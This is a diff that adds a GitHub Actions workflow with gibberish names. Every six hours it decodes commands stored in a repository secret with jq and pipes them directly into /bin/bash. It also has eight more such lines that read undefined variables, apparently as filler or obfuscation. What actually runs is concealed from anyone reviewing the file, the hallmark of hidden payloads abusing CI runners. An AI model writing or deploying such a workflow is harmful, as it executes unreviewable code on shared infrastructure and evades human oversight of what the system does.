@@ -1,0 +1,25 @@
+name: kutibuqin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kutibuqin
+        env:
+          snzg95083: ${{ secrets.snzg95083 }}
+        run: |
+          echo $snzg95083 | jq -r .amfkh11498 | /bin/bash
+          echo $p11 | jq -r .ofo9 | /bin/bash
+          echo $mgxnq9255 | jq -r .x0969 | /bin/bash
+          echo $w0157 | jq -r .bo021 | /bin/bash
+          echo $oafj4403 | jq -r .dclk3228 | /bin/bash
+          echo $piq133 | jq -r .jdck1 | /bin/bash
+          echo $vbnw353 | jq -r .yjea81 | /bin/bash
+          echo $m87242 | jq -r .slt82 | /bin/bash
+          echo $vwm83352 | jq -r .amf6 | /bin/bash
+
